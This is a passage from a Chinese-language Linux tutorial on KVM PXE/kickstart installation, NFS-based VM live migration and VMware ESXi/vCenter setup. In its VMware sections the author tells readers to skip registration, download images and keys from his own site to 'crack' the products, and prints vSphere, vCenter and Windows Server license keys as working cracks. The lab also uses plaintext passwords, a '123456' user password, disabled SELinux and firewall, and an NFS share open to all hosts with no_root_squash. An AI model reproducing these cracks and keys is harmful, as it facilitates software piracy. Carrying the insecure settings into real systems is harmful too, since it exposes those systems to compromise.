    link/ether 52:54:00:97:16:3e brd ff:ff:ff:ff:ff:ff
    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0
       valid_lft forever preferred_lft forever
4: virbr0-nic: <BROADCAST,MULTICAST> mtu 1500 qdisc pfifo_fast master virbr0 state DOWN group default qlen 1000
    link/ether 52:54:00:97:16:3e brd ff:ff:ff:ff:ff:ff
8: virbr1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:0c:29:e7:e8:52 brd ff:ff:ff:ff:ff:ff
    inet 10.0.0.7/24 brd 10.0.0.255 scope global noprefixroute virbr1
       valid_lft forever preferred_lft forever
    inet6 fe80::f8a5:76f7:6e6f:67a0/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

##### 46.8.5.2 创建虚拟机PXE启动并利用kickstart自动安装系统

![1658932287720](linux体系.assets/1658932287720.png)

```
#注意: 取消vmnet8的DHCP功能
[root@centos8 ~]# yum -y install dhcp-server tftp-server httpd syslinux-nonlinux

[root@centos8 ~]# vim /etc/dhcp/dhcpd.conf
#
# DHCP Server Configuration file.
#   see /usr/share/doc/dhcp-server/dhcpd.conf.example
#   see dhcpd.conf(5) man page
#
option domain-name "liusenbiao.org";
option domain-name-servers 180.76.76.76,223.6.6.6;
default-lease-time 600;
max-lease-time 7200;
log-facility local7;
subnet 10.0.0.0 netmask 255.255.255.0 {
 range 10.0.0.100 10.0.0.200;
 option routers 10.0.0.2;
 next-server 10.0.0.8;
 filename "pxelinux.0";
}


[root@centos8 ~]# systemctl enable --now httpd tftp dhcpd
[root@centos8 ~]# mkdir /var/lib/tftpboot/centos{6,7,8}
[root@centos8 ~]# cp /usr/share/syslinux/{pxelinux.0,menu.c32} /var/lib/tftpboot/
[root@centos8 ~]# cp /var/www/html/centos/8/os/x86_64/isolinux/{vmlinuz,initrd.img} /var/lib/tftpboot/centos8
[root@centos8 ~]# cp /var/www/html/centos/8/os/x86_64/isolinux/{ldlinux.c32,libcom32.c32,libutil.c32} /var/lib/tftpboot/
[root@centos8 ~]# mkdir /var/lib/tftpboot/pxelinux.cfg/
[root@centos8 ~]# cp /var/www/html/centos/8/os/x86_64/isolinux/isolinux.cfg /var/lib/tftpboot/pxelinux.cfg/default


[root@centos8 ~]# vim /var/lib/tftpboot/pxelinux.cfg/default

default menu.c32
timeout 600
menu title Install CentOS Linux

label linux8
 menu default
 menu label Auto Install CentOS Linux ^8
 kernel centos8/vmlinuz
 append initrd=centos8/initrd.img ks=http://10.0.0.8/ks/centos8.cfg
  
label manual
 menu label ^Manual Install CentOS Linux 8.0
 kernel centos8/vmlinuz
 append initrd=centos8/initrd.img inst.repo=http://10.0.0.8/centos/8/os/x86_64/

label rescue
 menu label ^Rescue a CentOS Linux system 8
 kernel centos8/vmlinuz
 append initrd=centos8/initrd.img inst.repo=http://10.0.0.8/centos/8/os/x86_64/
rescue
 
label local
 menu label Boot from ^local drive
 localboot 0xffff
 
 
 [root@centos8 ~]# tree /var/lib/tftpboot/
/var/lib/tftpboot/
├── centos6
├── centos7
├── centos8
│   ├── initrd.img
│   └── vmlinuz
├── ldlinux.c32
├── libcom32.c32
├── libutil.c32
├── menu.c32
├── pxelinux.0
└── pxelinux.cfg
    └── default

4 directories, 8 files


##应答文件
[root@centos8 ~]# vim /var/www/html/ks/centos8.cfg
ignoredisk --only-use=vda  #因为使用virtIO磁盘,注意磁盘名称为vda
zerombr
text
reboot
clearpart --all --initlabel
selinux --disabled
firewall --disabled
url --url=http://10.0.0.8/centos/8/os/x86_64/
keyboard --vckeymap=us --xlayouts='us'
lang en_US.UTF-8

bootloader --append="net.ifnames=0" --location=mbr --boot-drive=vda   #因为使用virtIO磁盘,注意磁盘名称为vda
network --bootproto=dhcp --device=eth0 --ipv6=auto --activate

network --hostname=centos8.org
rootpw --iscrypted $6$j9YhzDUnQVnxaAk8$qv7rkMcPAEbV5yvwsP666DXWYadd3jYjkA9fpxAo9qYotjGGBUclCGoP1TRvgHBpqgc5n0RypMsPTQnVDcpO01
firstboot --enable
skipx
services --disabled="chronyd"
timezone Asia/Shanghai --isUtc --nontp
user --name=liu --password=6oUfb/02CWfLb5l8f$sgEZeR7c7DpqfpmFDH6huSmDbW1XQNR4qKl2EPns.gOXqlnAIgv9pTogtFVaDtEpMOC.SWXKYqxfVtd9MCwxb1 --iscrypted --gecos="liu"

autopart --type=lvm
%packages
@^minimal-environment
kexec-tools
%end
%addon com_redhat_kdump --enable --reserve-mb='auto'
%end
%anaconda
pwpolicy root --minlen=6 --minquality=1 --notstrict --nochanges --notempty
pwpolicy user --minlen=6 --minquality=1 --notstrict --nochanges --emptyok
pwpolicy luks --minlen=6 --minquality=1 --notstrict --nochanges --notempty
%end

%post
useradd liuge
echo 123456 | passwd --stdin liuge &> /dev/null
%end




#创建磁盘
[root@centos8 ~]# qemu-img create -f qcow2 /var/lib/libvirt/images/centos8-pxe.qcow2 10G

Formatting '/var/lib/libvirt/images/centos8-pxe.qcow2', fmt=qcow2 size=10737418240 cluster_size=65536 lazy_refcounts=off refcount_bits=16


#创建接自定网桥的虚拟机
[root@centos8 ~]# virt-install --virt-type kvm --name centos8-pxe --ram 2048 --vcpus 2 --disk bus=virtio,path=/var/lib/libvirt/images/centos8-pxe.qcow2 --graphics vnc,listen=0.0.0.0 --network=bridge:virbr1,model=virtio --pxe

WARNING  No operating system detected, VM performance may suffer. Specify an OS with --os-variant for optimal results.
Starting install...
```

![1658934159581](linux体系.assets/1658934159581.png)

![1658934192094](linux体系.assets/1658934210128.png)

![1658934374424](linux体系.assets/1658934374424.png)

#### 46.8.6 用户自定义的隔离的虚拟网络

此模式类似于Vmware中的仅主机的网卡模式,但无法和物理主机相通,只能在虚拟机之间互通.

![1658977581785](linux体系.assets/1658977581785.png)

##### 46.8.6.1 创建用户自定义的隔离的虚拟网络

![1658979025167](linux体系.assets/1658979025167.png)

![1658979114811](linux体系.assets/1658979114811.png)

![1658979434593](linux体系.assets/1658979434593.png)

**修改centos8的网卡**

![1658979941386](linux体系.assets/1658979941386.png)

**修改centos8-pxe的网卡**

![1658980069552](linux体系.assets/1658980069552.png)

**两个主机互相可以通讯**

![1658980642406](linux体系.assets/1658980642406.png)

**外网无法访问内网**

![1658981234650](linux体系.assets/1658981234650.png)

### 46.9 实战案例

#### 46.9.1 连接NAS共享存储实现虚拟机实时迁移

![1658981754950](linux体系.assets/1658981754950.png)

```
环境: 三台主机


两台KVM宿主机
一台CentOS8 10.0.0.8
一台CentOS7 10.0.0.7

一台NFS服务器: CentOS8 10.0.0.18


#注意:
两台宿主机的虚拟机都要一样的网卡配置,都事先实现virbr1的桥接(按照自定义网桥那一节去配置网桥)
要迁移的虚拟机必须是运行状态才可以迁移
建议从低版本向高版本的宿主机迁移,如:将CentOS7宿主机虚拟机迁移到CentOS8的宿主机上,反之可能失败
```

**先实现NFS服务**

```
#先在另一台主机10.0.0.18创建NFS服务及共享NFS目录
root@centos8_1:~# yum -y install nfs-utils
root@centos8_1:~# mkdir /data/kvmdata
root@centos8_1:~# echo '/data/kvmdata *(rw,no_root_squash)' > /etc/exports
root@centos8_1:~# systemctl enable --now nfs-server
root@centos8_1:~# exportfs -v
/data/kvmdata 	<world>(sync,wdelay,hide,no_subtree_check,sec=sys,rw,secure,no_root_squash,no_all_squash)
```

**10.0.0.8**

```
#保证10.0.0.8和10.0.0.7网络环境一样
#即两个机器都有virbr1的桥接网卡
[root@centos8 ~]# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel master virbr1 state UP group default qlen 1000
    link/ether 00:0c:29:5e:6b:05 brd ff:ff:ff:ff:ff:ff
3: virbr0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default qlen 1000
    link/ether 52:54:00:a3:b0:f9 brd ff:ff:ff:ff:ff:ff
    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0
       valid_lft forever preferred_lft forever
4: virbr0-nic: <BROADCAST,MULTICAST> mtu 1500 qdisc fq_codel master virbr0 state DOWN group default qlen 1000
    link/ether 52:54:00:a3:b0:f9 brd ff:ff:ff:ff:ff:ff
7: virbr1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000     #拥有virbr1的桥接网卡
    link/ether 00:0c:29:5e:6b:05 brd ff:ff:ff:ff:ff:ff
    inet 10.0.0.8/24 brd 10.0.0.255 scope global noprefixroute virbr1
       valid_lft forever preferred_lft forever
    inet6 fe80::20c:29ff:fe5e:6b05/64 scope link 
       valid_lft forever preferred_lft forever
11: virbr2: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default qlen 1000
    link/ether 52:54:00:4a:70:ca brd ff:ff:ff:ff:ff:ff
    inet 192.168.100.1/24 brd 192.168.100.255 scope global virbr2
       valid_lft forever preferred_lft forever     
12: virbr2-nic: <BROADCAST,MULTICAST> mtu 1500 qdisc fq_codel master virbr2 state DOWN group default qlen 1000
    link/ether 52:54:00:4a:70:ca brd ff:ff:ff:ff:ff:ff



#把磁盘文件迁移到10.0.0.18共享目录下
[root@centos8 ~]# scp /var/lib/libvirt/images/centos8-pxe.qcow2 10.0.0.18:/data/kvmdata/



#在宿主机的磁盘文件从目录中移到临时目录
[root@centos8 ~]# mv /var/lib/libvirt/images/* /opt/
```

**10.0.0.7**

```
#保证10.0.0.8和10.0.0.7网络环境一样
#即两个机器都有virbr1的桥接网卡
[12:39:28 root@centos7 ~]#ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast master virbr1 state UP group default qlen 1000
    link/ether 00:0c:29:e7:e8:52 brd ff:ff:ff:ff:ff:ff
3: virbr0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default qlen 1000
    link/ether 52:54:00:97:16:3e brd ff:ff:ff:ff:ff:ff
    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0
       valid_lft forever preferred_lft forever
4: virbr0-nic: <BROADCAST,MULTICAST> mtu 1500 qdisc pfifo_fast master virbr0 state DOWN group default qlen 1000
    link/ether 52:54:00:97:16:3e brd ff:ff:ff:ff:ff:ff
8: virbr1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000     #拥有virbr1的桥接网卡
    link/ether 00:0c:29:e7:e8:52 brd ff:ff:ff:ff:ff:ff
    inet 10.0.0.7/24 brd 10.0.0.255 scope global noprefixroute virbr1
       valid_lft forever preferred_lft forever
    inet6 fe80::f8a5:76f7:6e6f:67a0/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever




#把磁盘文件迁移到10.0.0.18共享目录下
[root@centos8 ~]# scp /var/lib/libvirt/images/centos7.qcow2  10.0.0.18:/data/kvmdata/


#在宿主机的磁盘文件从目录中移到临时目录
[12:40:55 root@centos7 ~]#mv /var/lib/libvirt/images/* /opt/
```

**在两台宿主机都实现存储**

**10.0.0.8宿主机上**

![1658983960286](linux体系.assets/1658983960286.png)

![1658984171034](linux体系.assets/1658984171034.png)

![1658984200602](linux体系.assets/1658985386830.png)

```
#10.0.0.8上查看挂载信息
[root@centos8 ~]# ll /var/lib/libvirt/images/
total 2325312
-rw-r--r-- 1 root root 2381119488 Jul 28 12:33 centos8-pxe.qcow2


[root@centos8 ~]# df
Filesystem              1K-blocks     Used Available Use% Mounted on
devtmpfs                  3957476        0   3957476   0% /dev
tmpfs                     3985408        0   3985408   0% /dev/shm
tmpfs                     3985408    17968   3967440   1% /run
tmpfs                     3985408        0   3985408   0% /sys/fs/cgroup
/dev/sda2               104806400 56797520  48008880  55% /
/dev/sda3                52403200 11972192  40431008  23% /data
/dev/loop0                1677618  1677618         0 100% /var/www/html/centos/8/os/x86_64
/dev/sda1                 1038336   231296    807040  23% /boot
/dev/sda6                    1003       21       911   3% /data/vm_images
tmpfs                      797080        8    797072   1% /run/user/0
10.0.0.18:/data/kvmdata  52403200  2723584  49679616   6% /var/lib/libvirt/images
```

**10.0.0.7宿主机上**

![1658984385943](linux体系.assets/1658984385943.png)

![1658984416671](linux体系.assets/1658984416671.png)

![1658984467922](linux体系.assets/1658984467922.png)

![1658984512208](linux体系.assets/1658984512208.png)

![1658984547522](linux体系.assets/1658985303625.png)

**10.0.0.8KVM宿主机虚拟机**

![1658987840975](linux体系.assets/1658987840975.png)

**10.0.0.7KVM宿主机虚拟机**

![1658987898384](linux体系.assets/1658987898384.png)

 **进行迁移**

先ping要迁移的主机查看是否有丢包情况

![1658990478084](linux体系.assets/1658994210228.png)

**添加要迁移的主机**

![1658990605733](linux体系.assets/1658990605733.png)

![1658990639353](linux体系.assets/1658990639353.png)



![1658993466120](linux体系.assets/1658993466120.png)

![1658993484328](linux体系.assets/1658993484328.png)

![1658994345149](linux体系.assets/1658994345149.png)

![1658994468958](linux体系.assets/1658994468958.png)





![1658994645232](linux体系.assets/1658994645232.png)

**丢包情况**

![1658994759397](linux体系.assets/1658994759397.png)

```
#可以看到迁移过来的虚拟机文件已经被移动到目标宿主机
[root@centos8 ~]# ll /etc/libvirt/qemu
total 52
drwxr-xr-x  2 root root    6 Jul 26 10:15 autostart
-rw-------  1 root root 5713 Jul 24 12:59 centos7-vm2.xml
-rw-------  1 root root 3260 Jul 24 13:07 centos7-vm3.xml
-rw-------  1 root root 3317 Jul 28 15:48 centos8-pxe.xml  #迁移成功！！！
-rw-------  1 root root 5206 Jul 25 18:50 centos8-test1.xml
-rw-------  1 root root 3601 Jul 24 11:55 centos8-vm3.xml
-rw-------  1 root root 5916 Jul 28 11:46 centos8.xml
drwx------. 3 root root   61 Jul 28 11:31 networks
-rw-------  1 root root 5323 Jul 24 20:42 Win2008.xml
-rw-------  1 root root 5050 Jul 25 10:38 Windows10.xml
```

 **再迁移回来**

![1658995083781](linux体系.assets/1658995083781.png)

#### 46.9.2 内外网络隔离综合案例

```
实现一个外网的web服务和内网的数据库相互隔离的环境。
两台宿主机host1和host2。
每个宿主机上面各有两个虚拟机,分别连接外网和内网交换机。
```

![1658995950569](linux体系.assets/1658995950569.png)

## 47.VMware vSphere

### 47.1 安装VMware ESXi

#### 47.1.1 注册账号

```
#需要注册账号并申请试用
https://my.VMware.com/cn/web/VMware/registration



#注意：
注册的过程很麻烦要注册两次才能下载到安装镜像，且试用期只有两个月，如果读者觉得注册的过程实在过于繁琐，可以直接跳过注册的流程，到我的网站http://liusenbiao.cn/download/VMware_vSphere/里面下载安装镜像和许可证密钥最直接破解。

具体操作细节详情在47.1.4 开始安装 VMware ESXi这一章节中！！
```

![1659010913002](linux体系.assets/1659010913002.png)

![1659011127836](linux体系.assets/1659011127836.png)

![1659010973957](linux体系.assets/1659010973957.png)

![1659011501204](linux体系.assets/1659011501204.png)



#### 47.1.2 申请试用VMware vSphere

```
#默认的帐号不能下载安装包，需要申请试用相应的产品才可以下载
https://customerconnect.vmware.com/cn/group/vmware/evalcenter?p=vsphere-eval-7
```

![1659011714647](linux体系.assets/1659011826636.png)

![1659011938247](linux体系.assets/1659011938247.png)

![1659012166460](linux体系.assets/1659012166460.png)

![1659012198816](linux体系.assets/1659012198816.png)

#### 47.1.3 下载VMware vSphere安装程序

```
#下载镜像地址
https://customerconnect.vmware.com/cn/group/vmware/evalcenter?p=vsphere-eval-7&source=evap


#需要下载文件汇总
VMware-VMvisor-Installer-7.0U3f-20036589.x86_64.iso
cn_windows_server_2016_x64_dvd_9718765.iso
VMware-VIM-all-6.7.0-14367737.iso   #for windows
VMware-VCSA-all-6.7.0-15132721.iso   #for linux
```

**需要下载汇总**

![1659012583740](linux体系.assets/1659012583740.png)

![1659012370565](linux体系.assets/1659012370565.png)

![1659013077305](linux体系.assets/1659013077305.png)

#### 47.1.4 开始安装 VMware ESXi

```
如果读者觉得注册的过程实在过于繁琐，可以直接跳过注册的流程，到我的网站http://liusenbiao.cn/download/VMware_vSphere/里面下载安装镜像和许可证密钥最直接破解。


#ESXi-node{1,2,3}账户密码
账户：root
密码：Xjy19970520@
```

![1659013384759](linux体系.assets/1659013384759.png)

![1659013258333](linux体系.assets/1659013258333.png)



![1659013311261](linux体系.assets/1659013311261.png)

![1659013368759](linux体系.assets/1659013368759.png)

![1659013668708](linux体系.assets/1659013668708.png)

![1659013700790](linux体系.assets/1659013700790.png)

![1659013812866](linux体系.assets/1659013812866.png)

![1659014019905](linux体系.assets/1659014019905.png)

![1659014089580](linux体系.assets/1659014089580.png)

![1659014148296](linux体系.assets/1659014148296.png)

![1659014191796](linux体系.assets/1659014191796.png)

![1659014592974](linux体系.assets/1659014592974.png)

![1659014632549](linux体系.assets/1659014632549.png)

![1659014652036](linux体系.assets/1659014652036.png)

![1659014689969](linux体系.assets/1659014689969.png)

![1659014729545](linux体系.assets/1659014729545.png)

![1659019689772](linux体系.assets/1659019689772.png)

![1659019755031](linux体系.assets/1659019755031.png)

![1659019839261](linux体系.assets/1659019839261.png)

![1659019969091](linux体系.assets/1659019969091.png)

![1659019992078](linux体系.assets/1659019992078.png)

#### 47.1.5 配置IP地址

**第一次重启后,默认为DHCP获取的IP地址,通常会将服务器配置为静态IP地址**

![1659020221269](linux体系.assets/1659020221269.png)

![1659020299224](linux体系.assets/1659020299224.png)

![1659020337122](linux体系.assets/1659020337122.png)

![1659020380627](linux体系.assets/1659020380627.png)

##### 47.1.5.1 配置界面进行登录

**可以看默认获取的动态IP,按F2进行登录**

![1659020604957](linux体系.assets/1659020604957.png)

**回车后登录,可以看到下面界面**

![1659020770881](linux体系.assets/1659020770881.png)

##### 47.1.5.2 设置静态IP

```
选中Configure Management Network 进入,再选中IPv4 configuration进行IP配置,回车确定。
默认为通过DHCP获取的IP地址,修改为静态IP地址。
```

![1659021073007](linux体系.assets/1659021073007.png)

![1659021122000](linux体系.assets/1659021122000.png)

**按空格选择第三个**

![1659021428253](linux体系.assets/1659021428253.png)

![1659021788944](linux体系.assets/1659021788944.png)

##### 47.1.5.3 配置DNS

**选中 DNS Coniguration 进入下面界面进行DNS 和主机名的配置,完成后回车确定**

![1659021547070](linux体系.assets/1659021547070.png)

![1659021705857](linux体系.assets/1659021705857.png)

**上面界面完成后, 按ESC退出后，再按Y确认重启网络服务**

![1659021769371](linux体系.assets/1659021769371.png)

##### 47.1.5.4 启用本地登录和ssh服务连接功能

**选中 Troubleshoot Options 进行 ssh 服务配置**

![1659056096421](linux体系.assets/1659056096421.png)

**选中 Enable ESXi shell 回车启用shell** 

![1659056513807](linux体系.assets/1659056513807.png)

**按Ctrl+Alt+F1进入linux登陆界面**

![1659056634646](linux体系.assets/1659056634646.png)

**按Ctrl+Alt+F2返回原先界面**

![1659056692648](linux体系.assets/1659056692648.png)

**之后选中 Enable SSH 回车启用 ssh服务,成功后可以看到下面显示**

![1659056773237](linux体系.assets/1659056773237.png)

##### 47.1.5.5 本地登录修改ssh服务允许基于密码登录

```
默认无法用密码登录ssh服务,只支持基于key登录, 需要修改配置才可以实现基于密码登录。
使用xshell连接时会出现下面提示。

修改sshd服务的配置文件/etc/ssh/sshd_config，将 PasswordAuthentication no 此行修改为yes并保存。
```

![1659057567438](linux体系.assets/1659057567438.png)

![1659057756797](linux体系.assets/1659057756797.png)

![1659057776274](linux体系.assets/1659057776274.png)

![1659057801929](linux体系.assets/1659057801929.png)

##### 47.1.5.6 vSphere 7 Enterprise Plus破解

![1659062073574](linux体系.assets/1659062073574.png)

**添加许可证密钥**

![1659062190399](linux体系.assets/1659062190399.png)

![1659062228258](linux体系.assets/1659062228258.png)

![1659062262936](linux体系.assets/1659062262936.png)

**已经永久有效**

![1659062298302](linux体系.assets/1659062298302.png)

![1659062314932](linux体系.assets/1659062314932.png)

### 47.2 创建虚拟机

#### 47.2.1 准备需要安装系统的ISO镜像

```
将 ISO文件上传至保存在当前ESXi节点上
存储---数据存储浏览器---创建目录
```

![1659062819245](linux体系.assets/1659062819245.png)

![1659062864625](linux体系.assets/1659062864625.png)

![1659063571799](linux体系.assets/1659066066831.png)

![1659066079580](linux体系.assets/1659066079580.png)

```
准备三个ESXi-node节点
他们的地址分别为：
ESXi-node1 10.0.0.101
ESXi-node2 10.0.0.102
ESXi-node3 10.0.0.103
```

![1659066351824](linux体系.assets/1659066351824.png)

**ESXi-node1 10.0.0.101**

![1659066579094](linux体系.assets/1659066579094.png)

**ESXi-node1 10.0.0.102**

![1659066685394](linux体系.assets/1659066685394.png)

**ESXi-node1 10.0.0.103**

![1659066715826](linux体系.assets/1659066715826.png)

#### 47.2.2 创建NFS共享

```
#先在另一台主机10.0.0.8创建NFS服务及共享NFS目录
root@centos8_1:~# yum -y install nfs-utils
root@centos8_1:~# mkdir /data/nfs
root@centos8_1:~# echo '/data/nfs *(rw,no_root_squash)' > /etc/exports
root@centos8_1:~# systemctl enable --now nfs-server
root@centos8_1:~# exportfs -v
/data/nfs 	<world>(sync,wdelay,hide,no_subtree_check,sec=sys,rw,secure,no_root_squash,no_all_squash)
```

![1659068693596](linux体系.assets/1659068693596.png)

![1659068768788](linux体系.assets/1659068768788.png)

![1659068811089](linux体系.assets/1659068811089.png)

![1659069036470](linux体系.assets/1659069036470.png)

#### 47.2.3 开始创建虚拟机

##### 47.2.3.1 开始创建虚拟机并选择类型

**虚拟机----新建/注册虚拟机, 按下面显示安装**

![1659069609845](linux体系.assets/1659069609845.png)

##### 47.2.3.2 定义虚拟机名称与版本

![1659070043809](linux体系.assets/1659070043809.png)

##### 47.2.3.3 定义存储

![1659070142599](linux体系.assets/1659070142599.png)

##### 47.2.3.4 自定义配置

```
#磁盘置备说明
1、厚置备延迟置零(默认 default)：

默认的创建格式，创建过程中为虚拟磁盘分配所需空间。创建时不会擦除物理设备上保留的任何数据，没有置零操作，当有IO操作时，需要等待清零操作完成后才能完成IO，即：分配好空间，执行写操作时才会按需要将其置零。

2、厚置备置零(thick)：
创建支持群集功能的厚磁盘。在创建时为虚拟磁盘分配所需的空间。并将物理设备上保留的数据置零。创建这种格式的磁盘所需的时间可能会比创建其他类型的磁盘长。即：分配好空间并置零操作，有IO的时无需等待任何操作直接执行。

3、精简置备（thin）：
精简配置就是无论磁盘分配多大，实际占用存储大小是现在使用的大小，即用多少算多少。当客户机有输入输出的时候，VMkernel首先分配需要的空间并进行清零操作，也就是说如果使用精简配置在有IO的时候需要：等待分配空间和清零，这两个步骤完成后才能进行操作，对于IO叫频繁的应用这样性能会有所下降，虽然节省了存储空间。





#磁盘模式说明
从属:是默认的磁盘模式，它既无特殊性也无特殊要求，只有普通的vmdk磁盘。创建快照后，数据将与磁盘增量一起保存，以根据需要添加到现有数据中或删除。

独立-持久:如果经常使用快照功能，则它非常有用。还原快照时，在此模式下它完全不会影响磁盘。这种磁盘在数据不需要恢复到初始状态的情况下非常有用，例如系统日志或站点日志，其内容需要保存在当前状态。删除快照时切换到此磁盘模式，如果启动或停止VM，数据将保持不变。

独立-非持久:这是一个重做磁盘，这意味着如果在启用“独立–非–持久”模式的情况下启动VM，则所有更改都将写入磁盘增量中。以前存在的数据为只读。因此，如果停止或启动虚拟机（不是重启，不影响任何操作），或者删除快照，则所有更改都将被放弃。

总而言之，你可以打开和关闭这些模式中的每一个，但是请记住，只有在VM停止后才能这样做。
```

![1659070626038](linux体系.assets/1659070626038.png)

![1659070642305](linux体系.assets/1659070642305.png)

![1659070752308](linux体系.assets/1659070752308.png)

##### 47.2.3.5 开始安装过程

![1659070846221](linux体系.assets/1659070872383.png)

![1659070894638](linux体系.assets/1659070894638.png)

![1659070967114](linux体系.assets/1659070967114.png)

![1659071181928](linux体系.assets/1659071181928.png)

![1659071634115](linux体系.assets/1659071634115.png)

![1659071693036](linux体系.assets/1659071693036.png)

##### 47.2.3.6 安装完成

![1659071791902](linux体系.assets/1659071791902.png)

##### 47.2.3.7 将虚拟机的光驱卸载

关闭虚拟机后,再将虚拟机光驱卸载,以防止后期迁移虚拟机出错

**注意: 关闭虚拟机后再修改配置,否则会很慢**

![1659090603252](linux体系.assets/1659090603252.png)

![1659090642383](linux体系.assets/1659090642383.png)

### 47.3 安装VMware vCenter Server

#### 47.3.1环境依赖

```
1)必须安装在系统版本是Windows Server 2008 SP2(需要打补丁和相关运行时环境)或更高版本，本环境以Windows Server 2016为例。
2)VMware vSphere需要最小8176MB内存，假如内存大小不符合要求，则报错。
3）Windows Server 2008 系统需要安装运行时, Windows Server 2016则无需安装。
```

#### 47.3.2 安装Windows Server

![1659091929997](linux体系.assets/1659091929997.png)

![1659091970069](linux体系.assets/1659091970069.png)

![1659092569754](linux体系.assets/1659092569754.png)

![1659094940636](linux体系.assets/1659094940636.png)

![1659095057679](linux体系.assets/1659095057679.png)

![1659096030399](linux体系.assets/1659096030399.png)

**开机启动，出现这个界面按回车即可！！！**

![1659096175103](linux体系.assets/1659096175103.png)

![1659096399856](linux体系.assets/1659096399856.png)

![1659096440114](linux体系.assets/1659096440114.png)

**产品密钥：CB7KF-BWN84-R7R2Y-793K2-8XDDG**

![1659096816937](linux体系.assets/1659097145613.png)

**注意: 选择Datacenter(桌面体验)选项：功能最强！！**

![1659097286591](linux体系.assets/1659097286591.png)

![1659097366226](linux体系.assets/1659097366226.png)

![1659097411835](linux体系.assets/1659097411835.png)

![1659097434246](linux体系.assets/1659097434246.png)

![1659097483505](linux体系.assets/1659097483505.png)

![1659098771902](linux体系.assets/1659098771902.png)

**按Ctrl+Alt+Insert解锁**

![1659098836185](linux体系.assets/1659098836185.png)

![1659100447422](linux体系.assets/1659100447422.png)

#### 47.3.3 登录并修改配置

**配置静态IP地址：**

![1659106265564](linux体系.assets/1659106265564.png)

![1659106311462](linux体系.assets/1659106311462.png)

![1659106390965](linux体系.assets/1659106390965.png)

![1659106473170](linux体系.assets/1659106473170.png)

![1659106606988](linux体系.assets/1659106606988.png)

#### 47.3.4 安装VMware vCenter Server

在windows server 2016安装 VMware vcenter server

##### 47.3.4.1 将光盘换成 vcenter ISO镜像

**挂载光盘镜像 VMware-VIM-all-6.7.0-14367737.iso**

![1659106959541](linux体系.assets/1659106959541.png)

##### 47.3.4.2 通过镜像加载安装程序

![1659107050243](linux体系.assets/1659107050243.png)

![1659107112753](linux体系.assets/1659107112753.png)

![1659107173214](linux体系.assets/1659107173214.png)

![1659107219271](linux体系.assets/1659107219271.png)

![1659107273664](linux体系.assets/1659107273664.png)

![1659107499083](linux体系.assets/1659107499083.png)

![1659107560968](linux体系.assets/1659107560968.png)

![1659107679697](linux体系.assets/1659107679697.png)

![1659107861093](linux体系.assets/1659107861093.png)

![1659107888725](linux体系.assets/1659107888725.png)

![1659107938898](linux体系.assets/1659107938898.png)

![1659107962379](linux体系.assets/1659107962379.png)

![1659108000750](linux体系.assets/1659108000750.png)

![1659108014490](linux体系.assets/1659108014490.png)

![1659108140838](linux体系.assets/1659108140838.png)

##### 47.3.4.3 安装完成

![1659110601961](linux体系.assets/1659110601961.png)

### 47.4 管理VMware vCenter

#### 47.4.1 通过浏览器访问VMware vSphere

**先进行域名解析**

![1659143686338](linux体系.assets/1659143686338.png)

```
用户名：administrator@vsphere.local
密码：Xjy19970520@
```

![1659143890020](linux体系.assets/1659143890020.png)

![1659144022430](linux体系.assets/1659144022430.png)

#### 47.4.2 添加ESXi主机到 VMware vCenter管理

##### 47.4.2.1 破解Vcenter

**许可证密钥：4G2XN-4610P-WZGC8-5R8N4-1AVH5**

![1659145972803](linux体系.assets/1659145972803.png)

![1659145998464](linux体系.assets/1659145998464.png)

![1659146047035](linux体系.assets/1659146047035.png)

![1659146062692](linux体系.assets/1659146062692.png)

![1659146089847](linux体系.assets/1659146089847.png)

![1659146118450](linux体系.assets/1659146118450.png)

**破解成功！！**

![1659146159889](linux体系.assets/1659146159889.png)

![1659146222770](linux体系.assets/1659146222770.png)

##### 47.4.2.2 Vcenter注册虚拟机

```
一定要注意版本一致性的问题，如果你的esxi-node4用的是7.0版本，而你的Vcenter用的6.7版本，vcenter远程管理会出错。
```

**版本不一致的问题：**

![1659150715371](linux体系.assets/1659150715371.png)

![1659146603898](linux体系.assets/1659146603898.png)

![1659146693283](linux体系.assets/1659146693283.png)

![1659146726902](linux体系.assets/1659146726902.png)

![1659146805206](linux体系.assets/1659146805206.png)

![1659146829058](linux体系.assets/1659146829058.png)

![1659146882915](linux体系.assets/1659146882915.png)

![1659146929101](linux体系.assets/1659146929101.png)

![1659146998873](linux体系.assets/1659147177140.png)

![1659147056063](linux体系.assets/1659147056063.png)

![1659147069603](linux体系.assets/1659147069603.png)

![1659147084043](linux体系.assets/1659147084043.png)

**远程管理成功！！**

![1659151039763](linux体系.assets/1659151039763.png)

#### 47.4.3 批量管理虚拟机

##### 47.4.3.1 将虚拟机克隆生成新的虚拟机

```
基于现在的虚拟机克隆来创建新的虚拟机
如果跨ESXi主机克隆虚拟机,需要事先将光盘断开连接
注意:先关闭虚拟机再修改配置
```

![1659152100673](linux体系.assets/1659152100673.png)

![1659152167922](linux体系.assets/1659152167922.png)

![1659152222922](linux体系.assets/1659152222922.png)

